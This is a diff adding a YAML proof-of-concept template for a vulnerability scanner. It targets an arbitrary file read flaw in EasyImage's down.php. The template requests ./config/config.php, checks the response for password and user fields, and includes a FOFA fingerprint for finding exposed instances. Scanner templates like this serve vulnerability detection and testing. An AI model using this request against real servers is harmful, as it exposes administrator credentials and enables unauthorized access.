@@ -1,0 +1,16 @@
+id: poc-yaml-easyImage-down-any-fileread
+info:
+  name: EasyImage down.php 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: EasyImage
+  fofa: app="EasyImage-简单图床"
+requests:
+- method: GET
+  path: /application/down.php?dw=./config/config.php
+  expression: "status_code == 200 && \ncontains(body,\"'password'=>\") &&\ncontains(body,\"\
+    'user'=>\") &&\ncontains(body,\"'imgurl'=>\") &&\ncontains(body,\"'waterText'=>\"\
+    ) &&\ncontains(body,\"'domain'=>\")\n"
+variables: {}
+transport: http
